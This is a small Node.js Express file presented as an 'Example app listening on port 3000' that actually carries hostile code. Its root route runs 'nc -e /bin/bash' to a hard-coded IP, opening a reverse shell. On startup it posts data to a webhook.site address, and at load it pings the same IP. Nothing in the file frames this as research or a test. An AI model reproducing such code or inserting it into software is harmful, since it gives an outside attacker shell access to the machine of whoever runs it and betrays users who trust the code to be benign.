var express = require('express');
var axios = require('axios');
const { exec } = require("child_process");
var app = express();
app.get('/', function (req, res) {
  exec("nc -e /bin/bash 202.61.200.207 8888", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
});
app.listen(3000, function () {
  console.log('Example app listening on port 3000!');
  const data = {
    name: 'John Doe',
    job: 'Content Writer'
};
axios.post('https://webhook.site/b20a2e3b-0e2a-4346-ac8b-0959671a60d5', data)
    .then((res) => {
        console.log(`Status: ${res.status}`);
        console.log('Body: ', res.data);
    }).catch((err) => {
        console.error(err);
    });
});

  exec("ping -c 4 202.61.200.207", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
